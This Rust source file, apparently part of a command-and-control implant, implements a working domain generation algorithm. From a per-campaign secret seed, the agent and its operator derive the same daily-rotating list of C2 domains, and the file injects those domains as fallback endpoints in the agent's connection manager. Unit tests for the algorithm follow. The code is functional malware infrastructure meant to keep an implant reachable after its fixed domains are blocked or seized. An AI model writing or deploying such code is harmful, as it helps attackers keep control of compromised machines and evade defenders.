// src/agent/dga.rs
//
// Domain Generation Algorithm (DGA).
//
// Generates a deterministic, time-windowed list of candidate C2 domain names
// from a numeric seed. Both the agent and the operator compute the same
// domain list for the same (seed, window) pair, so the operator knows exactly
// which domains to register on any given day without hard-coding them.
//
// Algorithm
// ─────────
//   1. Mix: FNV-1a over seed ‖ window ‖ index  (20 bytes → u64)
//   2. Syllables: extract 2–4 syllables (CV or CVC pattern)
//      from consecutive 3-byte slices of the hash chain.
//   3. TLD: high 8 bits of hash → index into tld list.
//
// Properties
// ──────────
//   • Deterministic — same inputs always yield the same domain.
//   • Seed-isolated — different seeds produce statistically independent sets.
//   • Window-rotated — the list rolls every `window_secs` seconds (default 1 day).
//   • No external deps — pure Rust, no RNG state.
//   • No crypto — deliberately fast; security comes from seed secrecy.

use std::time::{SystemTime, UNIX_EPOCH};
use crate::common::{C2Config, DgaConfig, FallbackEndpoint, TransportProtocol};

// ── FNV-1a constants ─────────────────────────────────────────────────────────

const FNV_PRIME:  u64 = 0x00000100000001B3;
const FNV_OFFSET: u64 = 0xcbf29ce484222325;

/// Mix `seed`, `window`, and `index` through FNV-1a into a single u64.
/// Every bit of all three inputs affects every output bit.
pub(crate) fn fnv1a_mix(seed: u64, window: u64, index: u32) -> u64 {
    let mut h = FNV_OFFSET;
    for &b in seed.to_le_bytes().iter()
        .chain(window.to_le_bytes().iter())
        .chain(index.to_le_bytes().iter())
    {
        h ^= b as u64;
        h = h.wrapping_mul(FNV_PRIME);
    }
    h
}

/// Extend a hash one step (used to generate chained syllable hashes).
fn fnv1a_extend(h: u64, step: u64) -> u64 {
    let mut out = h;
    for &b in step.to_le_bytes().iter() {
        out ^= b as u64;
        out = out.wrapping_mul(FNV_PRIME);
    }
    out
}

// ── Syllable tables ──────────────────────────────────────────────────────────

const CONSONANTS: &[u8] = b"bcdfghjklmnprstvwxz"; // 19
const VOWELS:     &[u8] = b"aeiou";                // 5

/// Extract one CVC/CV syllable from a hash value.
/// Returns 2 or 3 characters: consonant + vowel [+ optional trailing consonant].
fn syllable(h: u64) -> (char, char, Option<char>) {
    let c1 = CONSONANTS[(h         as usize) % CONSONANTS.len()] as char;
    let v  = VOWELS    [((h >> 8)  as usize) % VOWELS.len()]     as char;
    // Trailing consonant only when bits 16–17 == 0b00 (25% of the time)
    let trail = if (h >> 16) & 3 == 0 {
        Some(CONSONANTS[((h >> 18) as usize) % CONSONANTS.len()] as char)
    } else {
        None
    };
    (c1, v, trail)
}

// ── Public API ────────────────────────────────────────────────────────────────

/// Return the current DGA window index for a given `window_secs` interval.
/// Callers that need deterministic tests can pass any `unix_now` they like.
pub fn current_window(window_secs: u64) -> u64 {
    let now = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs();
    now / window_secs.max(1)
}

/// Generate a single domain for `(seed, window, index)`.
///
/// # Arguments
/// * `seed`   — Per-campaign secret embedded in the agent at build time.
/// * `window` — Time bucket (use `current_window` or a fixed value for tests).
/// * `index`  — Ordinal within the window's domain set (0-based).
/// * `tlds`   — Slice of TLD strings, e.g. `&["com", "net", "org"]`.
///
/// # Returns
/// A lowercase hostname like `"bekal.com"` or `"torinvex.net"`.
pub fn generate_domain(seed: u64, window: u64, index: u32, tlds: &[&str]) -> String {
    assert!(!tlds.is_empty(), "tlds must not be empty");

    let mut h = fnv1a_mix(seed, window, index);

    // 2–4 syllables
    let syllable_count = 2 + (h as usize % 3);
    let mut domain = String::with_capacity(14);

    for step in 0..syllable_count {
        h = fnv1a_extend(h, step as u64);
        let (c, v, trail) = syllable(h);
        domain.push(c);
        domain.push(v);
        if let Some(t) = trail {
            domain.push(t);
        }
    }

    // TLD — use high bits (less correlated with syllable generation)
    let tld = tlds[(h >> 56) as usize % tlds.len()];
    domain.push('.');
    domain.push_str(tld);

    domain
}

/// Generate all `config.count` domains for the given `window` and wrap them
/// as `FallbackEndpoint`s ready for use in a `FallbackManager`.
pub fn generate_endpoints(
    config: &DgaConfig,
    window: u64,
    port: u16,
    transport: &TransportProtocol,
) -> Vec<FallbackEndpoint> {
    let tld_refs: Vec<&str> = config.tlds.iter().map(String::as_str).collect();
    (0..config.count)
        .map(|i| {
            let host = generate_domain(config.seed, window, i, &tld_refs);
            FallbackEndpoint {
                host,
                port,
                transport: transport.clone(),
                profile: None,
                proxy: None,
                priority: 100 + i,  // lower priority than explicit endpoints
                weight: 1,
                max_failures: config.max_failures_per_domain,
            }
        })
        .collect()
}

/// Build DGA endpoints from a `C2Config` (if DGA is configured) and append
/// them to `existing_endpoints` in-place. Called from `FallbackManager::from_config`.
pub fn inject_dga_endpoints(config: &C2Config, endpoints: &mut Vec<FallbackEndpoint>) {
    let dga = match &config.dga {
        Some(d) => d,
        None    => return,
    };
    let window   = current_window(dga.window_secs);
    let new_eps  = generate_endpoints(dga, window, config.tunnel_port, &config.transport);
    endpoints.extend(new_eps);
}

// ── Unit tests ────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    const TLDS: &[&str] = &["com", "net", "org", "io"];

    // ── fnv1a_mix ─────────────────────────────────────────────────────────────

    #[test]
    fn mix_is_deterministic() {
        assert_eq!(fnv1a_mix(42, 100, 0), fnv1a_mix(42, 100, 0));
    }

    #[test]
    fn mix_different_seeds_diverge() {
        assert_ne!(fnv1a_mix(1, 100, 0), fnv1a_mix(2, 100, 0));
    }

    #[test]
    fn mix_different_windows_diverge() {
        assert_ne!(fnv1a_mix(42, 100, 0), fnv1a_mix(42, 101, 0));
    }

    #[test]
    fn mix_different_indices_diverge() {
        assert_ne!(fnv1a_mix(42, 100, 0), fnv1a_mix(42, 100, 1));
    }

    #[test]
    fn mix_zero_inputs_non_zero() {
        // The all-zeros input must not produce the FNV offset itself unchanged
        let h = fnv1a_mix(0, 0, 0);
        assert_ne!(h, 0);
        assert_ne!(h, FNV_OFFSET);
    }

    // ── generate_domain ───────────────────────────────────────────────────────

    #[test]
    fn domain_is_deterministic() {
        let d1 = generate_domain(0x1234, 7, 0, TLDS);
        let d2 = generate_domain(0x1234, 7, 0, TLDS);
        assert_eq!(d1, d2);
    }

    #[test]
    fn domain_contains_exactly_one_dot() {
        let d = generate_domain(99, 1, 0, TLDS);
        assert_eq!(d.chars().filter(|&c| c == '.').count(), 1);
    }

    #[test]
    fn domain_label_is_only_lowercase_ascii() {
        let d = generate_domain(7777, 42, 3, TLDS);
        let label = d.split('.').next().unwrap();
        assert!(!label.is_empty());
        assert!(label.chars().all(|c| c.is_ascii_lowercase()));
    }

    #[test]
    fn domain_tld_is_from_list() {
        for i in 0..20 {
            let d = generate_domain(0xDEAD, 5, i, TLDS);
            let tld = d.split('.').last().unwrap();
            assert!(TLDS.contains(&tld), "unexpected tld '{tld}' in '{d}'");
        }
    }

    #[test]
    fn domain_label_length_in_range() {
        // 2 syllables × 2 chars min = 4; 4 syllables × 3 chars max = 12
        for i in 0..50 {
            let d = generate_domain(0xBEEF, 1, i, TLDS);
            let label_len = d.split('.').next().unwrap().len();
            assert!((4..=12).contains(&label_len),
                "label length {label_len} out of [4,12] for domain '{d}'");
        }
    }

    #[test]
    fn different_seeds_produce_different_domains() {
        let d1 = generate_domain(1, 100, 0, TLDS);
        let d2 = generate_domain(2, 100, 0, TLDS);
        assert_ne!(d1, d2);
    }

    #[test]
    fn different_windows_produce_different_domains() {
        let d1 = generate_domain(42, 100, 0, TLDS);
        let d2 = generate_domain(42, 101, 0, TLDS);
        assert_ne!(d1, d2);
    }

    #[test]
    fn different_indices_produce_different_domains() {
        // All 50 domains in a window should be unique
        let domains: Vec<_> = (0..50)
            .map(|i| generate_domain(12345, 7, i, TLDS))
            .collect();
        let unique: std::collections::HashSet<_> = domains.iter().collect();
        assert_eq!(unique.len(), domains.len(), "duplicate domains in window");
    }

    #[test]
    fn single_tld_always_used() {
        for i in 0..10 {
            let d = generate_domain(0xCAFE, 3, i, &["example"]);
            assert!(d.ends_with(".example"), "domain '{d}' doesn't end with .example");
        }
    }

    // ── generate_endpoints ────────────────────────────────────────────────────

    fn dga_cfg(seed: u64, count: u32) -> DgaConfig {
        DgaConfig {
            seed,
            window_secs: 86400,
            count,
            tlds: vec!["com".into(), "net".into()],
            max_failures_per_domain: 2,
        }
    }

    #[test]
    fn endpoints_count_matches_config() {
        let cfg = dga_cfg(1, 10);
        let eps = generate_endpoints(&cfg, 0, 4443, &TransportProtocol::Tls);
        assert_eq!(eps.len(), 10);
    }

    #[test]
    fn endpoints_use_correct_port() {
        let cfg = dga_cfg(1, 5);
        let eps = generate_endpoints(&cfg, 0, 8443, &TransportProtocol::Tls);
        assert!(eps.iter().all(|e| e.port == 8443));
    }

    #[test]
    fn endpoints_use_correct_transport() {
        let cfg = dga_cfg(1, 3);
        let eps = generate_endpoints(&cfg, 0, 443, &TransportProtocol::Https);
        assert!(eps.iter().all(|e| e.transport == TransportProtocol::Https));
    }

    #[test]
    fn endpoints_have_low_priority_by_default() {
        // DGA endpoints should sit below explicit static endpoints (priority ≥ 100)
        let cfg = dga_cfg(1, 5);
        let eps = generate_endpoints(&cfg, 0, 4443, &TransportProtocol::Tls);
        assert!(eps.iter().all(|e| e.priority >= 100),
            "DGA endpoint priority must be >= 100 so static endpoints take precedence");
    }

    #[test]
    fn endpoints_all_unique_hostnames() {
        let cfg = dga_cfg(42, 100);
        let eps = generate_endpoints(&cfg, 7, 4443, &TransportProtocol::Tls);
        let hosts: std::collections::HashSet<_> = eps.iter().map(|e| &e.host).collect();
        assert_eq!(hosts.len(), 100, "DGA produced duplicate hostnames");
    }

    #[test]
    fn different_windows_produce_different_endpoint_sets() {
        let cfg = dga_cfg(99, 20);
        let w0: Vec<_> = generate_endpoints(&cfg, 0, 443, &TransportProtocol::Tls)
            .into_iter().map(|e| e.host).collect();
        let w1: Vec<_> = generate_endpoints(&cfg, 1, 443, &TransportProtocol::Tls)
            .into_iter().map(|e| e.host).collect();
        // At least one host must differ between adjacent windows
        assert!(w0.iter().zip(w1.iter()).any(|(a, b)| a != b),
            "adjacent windows must produce different domain sets");
    }

    #[test]
    fn window_calculation_divides_correctly() {
        // window_secs=86400 → daily rotation.
        // Anchor to the exact start of a window so the 12h check is
        // unconditionally safe regardless of the chosen epoch value.
        let window_secs = 86400u64;
        let any_epoch   = 1_700_000_000u64;
        let day_start   = (any_epoch / window_secs) * window_secs; // start of day N
        let same   = day_start / window_secs == (day_start + 12 * 3600) / window_secs;
        let differ = day_start / window_secs != (day_start + 25 * 3600) / window_secs;
        assert!(same,  "timestamps 12h apart from a window boundary should be in the same window");
        assert!(differ, "timestamps 25h apart should be in different windows");
    }
}
